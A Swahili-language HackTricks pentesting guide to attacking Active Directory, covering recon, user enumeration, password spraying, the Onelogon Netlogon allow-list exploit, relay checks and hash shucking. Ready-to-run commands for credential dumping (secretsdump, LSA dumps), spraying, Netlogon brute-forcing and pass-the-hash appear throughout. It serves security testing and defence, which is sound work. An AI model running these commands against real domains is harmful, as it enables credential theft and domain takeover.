# Mbinu ya Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** ni teknolojia ya msingi inayowezesha **wasimamizi wa mtandao** kuunda na kudhibiti kwa ufanisi **domain**, **watumiaji**, na **objects** ndani ya mtandao. Imeundwa ili iweze kupanuka, na kurahisisha kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** zinazoweza kudhibitiwa, huku ikidhibiti **haki za ufikiaji** katika viwango mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domain**, **tree**, na **forest**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **watumiaji** au **vifaa**, zinazotumia database moja. **Tree** ni mkusanyiko wa domain zilizounganishwa kwa muundo unaofanana, na **forest** ni mkusanyiko wa tree nyingi zilizounganishwa kupitia **trust relationships**, na hivyo kuunda tabaka la juu zaidi la muundo wa shirika. **Haki za ufikiaji** na **mawasiliano** mahususi zinaweza kuwekwa katika kila mojawapo ya viwango hivi.

Dhana muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusu objects za Active Directory.
2. **Object** – Huwakilisha vitu vilivyo ndani ya directory, ikiwemo **watumiaji**, **groups**, au **shared folders**.
3. **Domain** – Hutumika kama kontena la objects za directory; domain nyingi zinaweza kuwepo ndani ya **forest**, na kila moja ikihifadhi mkusanyiko wake wa objects.
4. **Tree** – Mkusanyiko wa domain zinazotumia root domain moja.
5. **Forest** – Kiwango cha juu zaidi cha muundo wa shirika katika Active Directory; huundwa na tree kadhaa zilizo na **trust relationships** kati yake.

**Active Directory Domain Services (AD DS)** hujumuisha huduma mbalimbali muhimu kwa usimamizi na mawasiliano ya kati ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Huweka data katika sehemu moja na kudhibiti mwingiliano kati ya **watumiaji** na **domain**, ikiwemo utendaji wa **uthibitishaji** na **utafutaji**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na usimamizi wa **vyeti vya kidijitali** salama.
3. **Lightweight Directory Services** – Huwezesha programu zinazotumia directory kupitia **itifaki ya LDAP**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** wa kuthibitisha watumiaji katika programu nyingi za wavuti ndani ya session moja.
5. **Rights Management** – Husaidia kulinda maudhui yenye hakimiliki kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utatuzi wa **majina ya domain**.

Kwa maelezo zaidi, angalia: [**TechTerms - Ufafanuzi wa Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili ujifunze jinsi ya **kushambulia AD**, unahitaji **kuielewa** vizuri sana **mchakato wa uthibitishaji wa Kerberos**.\
[**Soma ukurasa huu ikiwa bado hujui jinsi unavyofanya kazi.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kwenda [https://wadcoms.github.io/](https://wadcoms.github.io) ili kuona kwa haraka amri unazoweza kutumia ku-enumerate/kuexploit AD.

> [!WARNING]
> Mawasiliano ya Kerberos kwa kawaida **yanahitaji fully qualified domain name (FQDN)** ili mteja aweze kupata ticket ya SPN sahihi. Kufikia mashine kwa kutumia anwani ya IP kwa kawaida husababisha kutumia NTLM badala ya Kerberos.

## Recon ya Active Directory (Bila creds/sessions)

Ikiwa unaweza kufikia mazingira ya AD lakini huna credentials/sessions, unaweza:

- **Kufanya Pentest ya mtandao:**
  - Changanua mtandao, tafuta mashine na ports zilizo wazi, kisha ujaribu **kuexploit vulnerabilities** au **kutoa credentials** kutoka humo (kwa mfano, [printers zinaweza kuwa malengo ya kuvutia sana](ad-information-in-printers.md)).
  - Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu kwenye domain, kama vile web, printers, shares, vpn, media, n.k.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Angalia [**Mbinu ya jumla ya Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) ili upate maelezo zaidi kuhusu jinsi ya kufanya hili.
- **Angalia ufikiaji wa null na Guest kwenye huduma za smb** (hili halitafanya kazi kwenye matoleo ya kisasa ya Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Mwongozo wa kina zaidi wa ku-enumerate SMB server unapatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ku-enumerate LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Mwongozo wa kina zaidi wa ku-enumerate LDAP unapatikana hapa (zingatia **hasa ufikiaji wa anonymous**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Kuweka sumu kwenye mtandao**
  - Kusanya credentials kwa [**kuiga huduma ukitumia Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Fikia host kwa [**kutumia vibaya relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Kusanya credentials kwa **kuweka wazi** [**fake UPnP services ukitumia evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Toa usernames/majina kutoka kwenye nyaraka za ndani, mitandao ya kijamii, na huduma (hasa web) zilizo ndani ya mazingira ya domain, pamoja na taarifa zinazopatikana hadharani.
  - Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu miundo tofauti ya **username ya AD (**[**soma hili**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Miundo inayotumika zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _za kubahatisha na nambari 3 za kubahatisha_ (abc123).
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Ku-enumerate watumiaji

- **Ku-enumerate SMB/LDAP bila uthibitishaji:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Ku-enumerate Kerbrute**: **Username batili inapoombwa**, server itajibu kwa kutumia msimbo wa **hitilafu ya Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, na hivyo kutuwezesha kutambua kuwa username hiyo si halali. **Usernames halali** zitasababisha ama **TGT katika jibu la AS-REP** au hitilafu _KRB5KDC_ERR_PREAUTH_REQUIRED_, inayoashiria kuwa mtumiaji anatakiwa kufanya pre-authentication.
- **Kutumia MS-NRPC bila uthibitishaji**: Tumia auth-level = 1 (No authentication) dhidi ya interface ya MS-NRPC (Netlogon) kwenye domain controllers. Mbinu hii huita function ya `DsrGetDcNameEx2` baada ya kuunganisha interface ya MS-NRPC ili kuangalia kama mtumiaji au kompyuta ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unapatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ukipata mojawapo ya server hizi kwenye mtandao, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana ya [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**hii github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) na hii ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutokana na hatua ya recon uliyopaswa kufanya kabla ya hapo. Ukiwa na jina na ukoo, unaweza kutumia script ya [**namemash.py**](https://gist.github.com/superkojiman/11076951) kutengeneza majina ya watumiaji yanayoweza kuwa halali.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Hata baada ya **Zerologon** kurekebishwa kwenye DC, akaunti zilizoingizwa waziwazi kwenye allow-list bado zinaweza kuathiriwa na **tabia ya zamani/iliyo hatarishi ya Netlogon secure-channel**. Usanidi hatari ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au thamani inayolingana ya registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Thamani hiyo ni **security descriptor ya SDDL** (tazama [Security Descriptors](security-descriptors.md)). Akaunti au kikundi chochote kilichopewa ACE husika kwenye DACL kinaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` kwa vitendo huweka **Everyone** kwenye allow-list.

Mtiririko wa kazi kwa operator:

1. **Tambua principals zilizo kwenye allow-list** kwa kukagua **SYSVOL/GPO** na **registry hai ya DC**.
2. **Tafuta SIDs** zilizopatikana kwenye SDDL ili uzihusishe na watumiaji/kompyuta halisi za AD, na upe kipaumbele **akaunti za mashine za DC**, **akaunti za trust**, na mashine nyingine zenye haki za juu.
3. Jaribu mara kwa mara **uthibitishaji wa MS-NRPC / Netlogon** kwa kutumia akaunti iliyo kwenye allow-list.
4. Baada ya kubahatisha kwa mafanikio, tumia vibaya **uwekaji wa nenosiri la Netlogon** ili kuweka upya nenosiri la akaunti lengwa (public PoC huiweka kuwa mfuatano tupu).<sup>[[9]](#references)[[10]](#references)</sup>

Mifano ya haraka ya triage / lab kutoka kwenye artifact ya umma:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **Scanner** ni muhimu kwa sababu effective allow-list inaweza kuwa kwenye **SYSVOL**, kwenye **registry**, au kwenye vyote viwili.
- Njia ya exploit yenyewe ni muhimu kwa sababu **haihitaji ruhusa za Domain Admin** baada ya akaunti iliyo hatarini kutambuliwa.
- Kuingilia akaunti ya mashine ya **Domain Controller**, kama `DC$`, ni hatari hasa kwa sababu kuweka upya nenosiri hilo kunaweza kuwezesha moja kwa moja njia pana zaidi za **AD takeover**.
- Uwezekano wa **brute-force** kufanikiwa hutegemea mode: artifact ya umma inaeleza mbinu ya meet-in-the-middle, brute force ya **24-bit** pale akaunti nyingine ya kompyuta inapopatikana, na variants za **32-bit** zilizo polepole zaidi.

Detection / hardening notes:

- Kagua sera ya allow-list na uondoe kila kitu isipokuwa exceptions za muda za uoanifu zinazohitajika waziwazi.
- Fuatilia matukio ya DC **System** **5827/5828/5829/5830/5831** ili kugundua miunganisho ya Netlogon iliyo hatarini inapokataliwa, kugunduliwa, au kuruhusiwa waziwazi na sera.
- Chukulia akaunti zilizo kwenye `VulnerableChannelAllowList` kuwa **hatari kubwa** hadi utegemezi wa mfumo wa zamani uondolewe.

### Kujua jina moja au majina kadhaa ya watumiaji

Sawa, unajua tayari una jina halali la mtumiaji lakini huna nenosiri... Basi jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** sifa ya _DONT_REQ_PREAUTH_, unaweza **kuomba ujumbe wa AS_REP** wa mtumiaji huyo, ambao utakuwa na data iliyosimbwa kwa kutumia derivation ya nenosiri la mtumiaji.
- [**Password Spraying**](password-spraying.md): Hebu tujaribu **manenosiri ya kawaida zaidi** kwa kila mtumiaji aliyegunduliwa; huenda mtumiaji fulani anatumia nenosiri dhaifu (zingatia sera ya nenosiri!).
  - Kumbuka kuwa unaweza pia kufanya **spray kwenye seva za OWA** ili kujaribu kupata ufikiaji wa seva za barua pepe za watumiaji.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** **hashes** za changamoto kwa kufanya **poisoning** ya baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Uhesabuji wa Active Directory hutoa majina ya watumiaji, vitambulishi vya barua pepe na mifumo ya majina, host zinazoweza kulengwa, na services ambazo zinaweza kulazimishwa kufanya authentication. Tumia muktadha huo kutambua [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) za NTLM zinazowezekana na njia za kuingia kwenye mazingira ya AD.

### Upelelezi wa NetExec unaotumia workspace na ukaguzi wa relay posture

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya upelelezi wa AD kwa kila engagement: `workspace create <name>` huunda SQLite DB za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badili mwonekano kwa `proto smb|mssql|winrm` na orodhesha secrets zilizokusanywa kwa `creds`. Futa mwenyewe data nyeti ukimaliza: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Ugunduzi wa haraka wa subnet kwa kutumia **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **mahitaji ya SMB signing**, na **Null Auth**. Mashine zinazoonyesha `(signing:False)` ziko kwenye hatari ya **relay**, ilhali DC mara nyingi huhitaji signing.
- Tengeneza **hostnames kwenye /etc/hosts** moja kwa moja kutoka kwa matokeo ya NetExec ili kurahisisha ulengaji:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wakati **SMB relay to the DC imezuiwa** na signing, bado kagua hali ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / channel binding dhaifu. DC inayohitaji SMB signing lakini LDAP signing ikiwa imezimwa bado ni target inayofaa ya **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Uvujaji wa credentials za printer upande wa client → uthibitishaji wa credentials za domain kwa wingi

- UI za printer/web wakati mwingine **huweka nywila za admin zilizofichwa ndani ya HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (kwa mfano, `<input value="<password>">`), na kuruhusu ufikiaji wa Basic-auth kwenye hazina za scan/print.
- Print jobs zilizopatikana zinaweza kuwa na **nyaraka za onboarding zilizo katika plaintext** zenye nywila za kila mtumiaji. Linganisha jozi sawasawa unapojaribu:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steal NTLM Creds

Ikiwa unaweza **kufikia PC au share nyingine** kwa kutumia **null au guest user**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikifikiwa kwa namna fulani zita**anzisha uthibitishaji wa NTLM dhidi yako** ili uweze **kuiba** **challenge ya NTLM** na ku-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** hutumia kila NT hash uliyo nayo kama nenosiri linalowezekana kwa miundo mingine ya polepole zaidi, ambayo key material yake hutokana moja kwa moja na NT hash. Badala ya kufanya brute-force ya passphrase ndefu kwenye Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye NT-candidate modes za Hashcat na kuiacha ithibitishe matumizi tena ya nenosiri bila kuhitaji kujua plaintext. Hii huwa na nguvu hasa baada ya domain compromise, ambapo unaweza kukusanya maelfu ya NT hashes za sasa na za zamani.<sup>[[5]](#references)</sup>

Tumia shucking pale ambapo:

- Una mkusanyiko wa NT hashes kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu kama zimetumika tena katika domains/forests nyingine.
- Unakamata Kerberos material inayotumia RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), majibu ya NetNTLM, au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka matumizi tena ya passphrase ndefu zisizoweza ku-crack na kisha kuhamia mara moja kupitia Pass-the-Hash.

Mbinu hii **haifanyi kazi** dhidi ya aina za usimbaji fiche ambazo keys zake si NT hash (k.m., Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES pekee, lazima urudi kwenye password modes za kawaida.

#### Kujenga mkusanyiko wa NT hashes

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupata seti kubwa iwezekanavyo ya NT hashes (pamoja na thamani zake za awali):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Maingizo ya historia huongeza sana kundi la wagombea kwa sababu Microsoft inaweza kuhifadhi hadi hash 24 za awali kwa kila akaunti. Kwa njia zaidi za kukusanya siri za NTDS, angalia:

{{#ref}}
dcsync.md
{{#endref}}

- **Dampo za cache za endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data ya ndani ya SAM/SECURITY na logon za domain zilizowekwa kwenye cache (DCC/DCC2). Ondoa nakala zinazojirudia kisha ongeza hash hizo kwenye orodha ileile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex pekee). Hash zinazolingana hukuambia mara moja ni principal gani inayotumia tena password mara Hashcat inapochapisha candidate iliyoshinda.
- Pendelea candidates kutoka forest ileile au forest inayoaminika; hilo huongeza uwezekano wa overlap wakati wa shucking.

#### Modi za NT-candidate za Hashcat

| Aina ya Hash                            | Modi ya Password | Modi ya NT-candidate |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Maelezo:

- Ingizo za NT-candidate **lazima zibaki hash ghafi za NT zenye herufi 32 za hex**. Zima rule engines (usiweke `-r` wala kutumia hybrid modes) kwa sababu kubadilisha hash huharibu nyenzo muhimu za candidate key.
- Modi hizi si za haraka zaidi kiasili, lakini keyspace ya NTLM (~30,000 MH/s kwenye M3 Max) ina kasi ya takriban mara 100 kuliko Kerberos RC4 (~300 MH/s). Kujaribu orodha teule ya NT ni nafuu zaidi kuliko kuchunguza nafasi nzima ya password katika format ya polepole.
- Tumia **build ya hivi karibuni zaidi ya Hashcat** kila wakati (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modi 31500/31600/35300/35400 zilitolewa hivi karibuni.<sup>[[7]](#references)</sup>
- Kwa sasa hakuna modi ya NT ya AS-REQ Pre-Auth, na etypes za AES (19600/19700) zinahitaji password ya maandishi wazi kwa sababu keys zake hutokana na password za UTF-16LE kupitia PBKDF2, wala si hash ghafi za NT.

#### Mfano – Kerberoast RC4 (modi 35300)

1. Nasa RC4 TGS ya SPN lengwa kwa kutumia mtumiaji mwenye ruhusa ndogo (angalia ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck ticket kwa kutumia orodha yako ya NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat hupata ufunguo wa RC4 kutoka kwa kila mgombea wa NT na kuthibitisha blob ya `$krb5tgs$23$...`. Ulinganifu unathibitisha kuwa akaunti ya huduma inatumia mojawapo ya NT hashes zako zilizopo.

3. Pivot mara moja kupitia PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Unaweza kurejesha maandishi wazi baadaye kwa kutumia `hashcat -m 1000 <matched_hash> wordlists/` ikiwa itahitajika.

#### Mfano – Credentials zilizohifadhiwa kwenye cache (mode 31600)

1. Dump logons zilizohifadhiwa kwenye cache kutoka kwenye workstation iliyoathiriwa:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Nakili mstari wa DCC2 wa mtumiaji wa domain anayevutia kwenye `dcc2_highpriv.txt` kisha uifanyie shucking:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Match iliyofanikiwa hutoa NT hash ambayo tayari inajulikana kwenye orodha yako, na kuthibitisha kuwa mtumiaji aliyehifadhiwa kwenye cache anatumia tena password. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au ifanyie brute-force katika hali ya haraka ya NTLM ili kupata string.

Workflow ileile inatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Match ikitambuliwa, unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au ku-crack tena NT hash ukiwa offline kwa kutumia masks/rules.



## Enumeration ya Active Directory KWA kutumia credentials/session

Kwa awamu hii unahitaji kuwa **umecompromise credentials au session ya akaunti halali ya domain.** Ikiwa una credentials halali au shell ya mtumiaji wa domain, **unapaswa kukumbuka kuwa njia zilizotajwa awali bado zinaweza kutumiwa kucompromise watumiaji wengine**.

Kabla ya kuanza enumeration iliyothibitishwa, elewa **tatizo la Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kukompromise akaunti ni **hatua kubwa kuelekea kutathmini domain**, kwa sababu huwezesha **enumeration ya Active Directory** iliyothibitishwa:

Kuhusu [**ASREPRoast**](asreproast.md), sasa unaweza kupata kila mtumiaji anayeweza kuwa hatarini; na kuhusu [**Password Spraying**](password-spraying.md), unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu password ya akaunti iliyocompromise, password tupu na password mpya zinazoonekana kuwa na matumaini.

- Unaweza kutumia [**CMD kufanya recon ya msingi**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell kwa recon**](../basic-powershell-for-pentesters/index.html), ambayo itakuwa stealthier
- Unaweza pia [**kutumia powerview**](../basic-powershell-for-pentesters/powerview.md) ili kutoa maelezo ya kina zaidi
- Zana nyingine bora ya kufanya recon kwenye active directory ni [**BloodHound**](bloodhound.md). **Si stealthy sana** (kutegemea mbinu za ukusanyaji unazotumia), lakini **ikiwa hujali** hilo, hakika unapaswa kuijaribu. Tafuta mahali ambapo watumiaji wanaweza kutumia RDP, tafuta njia za kufikia makundi mengine, n.k.
  - **Zana nyingine za automated AD enumeration ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Kagua [**rekodi za DNS za AD**](ad-dns-records.md), kwani zinaweza kuwa na taarifa zinazovutia.
- **Zana yenye GUI** unayoweza kutumia ku-enumerate directory ni **AdExplorer.exe** kutoka kwenye **SysInternal** Suite.
- Unaweza pia kutafuta kwenye database ya LDAP kwa kutumia **ldapsearch** ili kutafuta credentials kwenye sehemu za _userPassword_ na _unixUserPassword_, au hata kwenye maelezo ya _description_ na _info_ ya mtumiaji. Tokeni isiyo na lebo kwenye _info_ inayofanana na password ni kidokezo tu: thibitisha matumizi na uhalali wake kando, na usijumuishe maudhui ya notes kwenye matokeo ya kawaida ya enumeration. Tazama [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa mbinu nyingine.
- Kagua scripts za domain logon na drive-mapping **unazoweza kufikia** chini ya `\\<dc>\NETLOGON` au `\\<dc>\SYSVOL\<domain>\scripts` pale ruhusa zinaporuhusu. [Microsoft inaeleza](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) jukumu la NETLOGON share kama saraka ya scripts. Orodhesha majina kwanza, kisha kagua scripts husika tu, ambazo unaweza kuzisoma na ziko ndani ya kikomo cha ukubwa; usitoe maudhui yote ya share wala kuonyesha credential values wakati wa enumeration ya kawaida. Wito wa PowerShell wa [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **haulindi** password halisi iliyohifadhiwa kwenye script. Wito huo pekee hauthibitishi kuwa secret imewekwa moja kwa moja kwenye script: fuatilia input yake halisi, kisha thibitisha kando akaunti, uhalali wa credential na privileges. Kukagua script ya domain kwenye remote share ni tofauti na enumeration ya host ya ndani.
- Ikiwa unatumia **Linux**, unaweza pia ku-enumerate domain kwa kutumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu zana za automated kama:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kutoa watumiaji wote wa domain**

  Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Kwenye Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana fupi, ndiyo sehemu muhimu zaidi kuliko zote. Fungua viungo (hasa cha cmd, powershell, powerview na BloodHound), jifunze jinsi ya ku-enumerate domain na ujifunze kwa vitendo hadi ujisikie vizuri. Wakati wa assessment, hii ndiyo hatua muhimu ya kupata njia ya kufikia DA au kuamua kuwa hakuna kinachoweza kufanywa.

### Akaunti za kompyuta zilizoundwa mapema zinazotabirika -> ufikiaji wa password ya gMSA

Akaunti za kompyuta zilizowekwa tayari kwa ajili ya kujiunga kwa kutumia mbinu za zamani zinaweza kubaki na password ya awali inayotabirika. Moduli ya NetExec ya `pre2k` hutambua thamani ya kipekee ya `userAccountControl` ya `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) na kujaribu kupata Kerberos TGT kwa kutumia herufi 14 za kwanza za jina la kompyuta lililoandikwa kwa herufi ndogo, bila `$` ya mwisho. Chukulia thamani hii ya UAC kama kichujio cha kutambua wagombea, badala ya kudhani kuwa uanachama wa **Pre-Windows 2000 Compatible Access** pekee unathibitisha kuwa password ni dhaifu.<sup>[[18]](#references)[[20]](#references)</sup>

Tumia LDAP enumeration iliyothibitishwa kujaribu wagombea na kuhifadhi TGT zilizofanikiwa. `ALL=True` huongeza majaribio kwa objects ambazo hazilingani na kichujio chaguomsingi cha `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Jaribio la bind la default/NTLM lililoshindwa **halibatilishi** finding hii: jaribu kwa `-k`, FQDN inayotatua kwenda kwenye DC, na saa iliyosawazishwa na KDC. Uendeshaji wa module uliofanikiwa huandika orodha za candidates na ccaches zilizopatikana chini ya `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

